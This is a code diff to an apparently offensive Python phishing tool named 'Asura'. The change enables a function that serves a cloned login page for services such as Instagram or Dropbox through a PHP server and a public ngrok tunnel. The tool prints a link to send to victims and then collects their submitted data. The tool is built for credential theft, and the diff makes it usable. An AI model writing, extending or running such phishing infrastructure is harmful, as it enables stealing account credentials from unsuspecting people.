@@ -121,20 +121,22 @@ def l_host(server):
         user_data(server)
 #Make a ngrok host
 def ngrok_s(server):
-    path = f"sites/{server}"
-    des = "pweb/"
-    os.system(f"cp -R {path} {des}")
-    print("\n")
-    port_ = random.randint(1150, 9999)
-    os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
-    os.system(f"./ngrok http http://127.0.0.1{port_} > /dev/null 2>&1")
-    l_res = requests.get("http://127.0.0.1:4043/api/tunnels")
-    yext = re.search("https://[0-9a-z].*\.ngrok.io", l_res.text)
-    print("\n")
-    print(f"{y}[{g}+{y}] {w} Send this link: ")
-    print(yext)
-
-
+    try:
+        path = f"sites/{server}"
+        des = "pweb/"
+        os.system(f"cp -R {path} {des}")
+        print("\n")
+        port_ = random.randint(1150, 9999)
+        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
+        os.system(f"./ngrok http http://127.0.0.1:{port_} > /dev/null 2>&1 & sleep 8")
+        os.system(f'echo -ne "Send this link: "')
+        os.system(f'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
+        user_data(server)
+    except:
+        print()
+        print(f"{r} _______{g}Exiting Asura{r}______")
+        time.sleep(2)
+        sys.exit(1)
 
 
 
@@ -150,7 +152,8 @@ def host_optn(server):
     if h_optn == "1" or h_optn == "01":
         l_host(server)
     elif h_optn == "2" or h_optn == "02":
-        print("Currently Ngrok is not available")
+        ngrok_s(server)
+    
 #Make options for websites..
 def optn():
     print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}11{y}] {c} Dropbox ")
